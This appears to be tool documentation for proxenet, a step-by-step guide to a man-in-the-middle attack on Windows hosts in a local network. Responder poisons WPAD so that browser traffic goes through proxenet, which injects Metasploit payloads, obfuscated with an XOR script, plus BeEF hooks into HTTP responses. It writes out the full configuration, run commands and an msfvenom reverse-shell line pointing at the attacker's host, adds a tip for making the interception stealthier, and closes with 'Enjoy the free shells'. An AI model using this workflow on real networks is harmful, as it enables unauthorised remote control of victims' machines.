# Proxenet-In-The-Middle attack #

`proxenet` can also be used to deliver automated payloads via a
Man-in-the-Middle attack. This can be done with the help of the awesome tool
[Responder](https://github.com/SpiderLabs/Responder) in two easy steps.


## Network setup ##

We will the Windows hosts on the network `192.168.56.0/24`. Our evil box will be
at `192.168.56.1`.

Let's do this.


## Responder setup ##

We will use `Responder` to spoof NetBIOS packets and poison local network
Windows workstation WPAD configuration to our evil box. The configuration is
pretty easy since we don't need any feature from `Responder` except the
poisoning.

**_Note_**: I used _jrmdev_ version of `Responder` because it is way cleaner
that the master version from SpiderLabs, and has better support for WPAD and
proxy forwarding. You can clone it from GitHub:

```
$ git clone https://github.com/jrmdev/Responder.git
$ cd Responder && git checkout -b remotes/origin/responder-refactoring
```

We only want to use the LLMNR and WPAD functionalities, so we will disable all
the rest. Simply set it up with the following configuration:
```
[Responder Core]
SQL = Off
SMB = Off
Kerberos = Off
FTP = Off
POP = Off
SMTP = Off
IMAP = Off
HTTP = Off
HTTPS = Off
DNS = Off
LDAP = Off
Challenge = 1122334455667788
Database = Responder.db
SessionLog = Responder-Session.log
PoisonersLog = Poisoners-Session.log
AnalyzeLog = Analyzer-Session.log
RespondTo =
RespondToName =
DontRespondTo =
DontRespondToName =

[HTTP Server]
Serve-Always = Off
Serve-Exe = Off
Serve-Html = Off
HtmlFilename = files/AccessDenied.html
ExeFilename = files/BindShell.exe
ExeDownloadName = ProxyClient.exe
WPADScript = function FindProxyForURL(url, host){ return 'PROXY ISAProxySrv:8008';}
HTMLToInject = <h1>pwn</h1>

[HTTPS Server]
SSLCert = certs/responder.crt
SSLKey = certs/responder.key
```

And just run it to forward to our `proxenet` (which will be listening on
`192.168.56.1:8008` - see next part).
```
sudo python2 Responder.py -v -I vboxnet0 -u 192.168.56.1:8008
```

`Responder` will now poison all the requests to our `proxenet` process.

![nbt-poison](img/nbt-poison.png)


## proxenet setup ##

When started, `proxenet` will start initializing plugins and appending them to
a list **only if** they are valid (filename convention and syntaxically
valid). Then it will start looking for events.

Create or edit the `proxenet` plugin configuration file, `$HOME/.proxenet.ini`
with the following sections.
```
[oPhishPoison]
; This should point to the payload to be inserted as the HTTP response.
; For example:
; msfvenom -p windows/reverse_tcp_shell -f raw -b '\x0d\x0a\x00\xff' -o mypayload LHOST=192.168.56.1 LPORT=4444
msfpayload   = %(home)s/tmp/my_payload

; Point to Python binary
python       = /usr/bin/python2.7

; Download https://gist.github.com/hugsy/18aa43255fd4d905a379#file-xor-payload-py
; and copy its path to this configuration script.
xor_payload  = %{home}/code/xor-payload/xor-payload.py

; This should point to the HTML page to inject every time a user fetches
; any HTML page
html_inject_stub = %(home)s/tmp/injected_page.html
```
The `html_inject_stub` option can be used also to easily inject your BeEF hooks
too.

The plugin `oPhishPoison.py` (available in the `proxenet-plugins` GitHub
repository) will deal with the substitution of the traffic the way you want.
You can insert any Metasploit Framework payload or an HTA page. The choice is
yours!

Add the plugin `oPhishPoison.py` to the autoload directory of `proxenet` and
start it.
```
$ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
$ ./proxenet -b 192.168.56.1 -p 8008
```

Or add the `-N` option to disable the SSL interception and make it stealthier.


## What's next?

Literally, nothing! The MitM will operate in a totally transparent way, that's
the beauty of it.

   1. The Windows hosts of the victims will get poisoned by `Responder` to point
   the WPAD NetBios name to our hosts.
   2. Whenever, the victim will use their web browser setup in
   "Auto-configuration".
   3. Every HTTP request will go through `proxenet` and the response will be
   poisoned with whatever content you setup.
   4. Enjoy the free shells !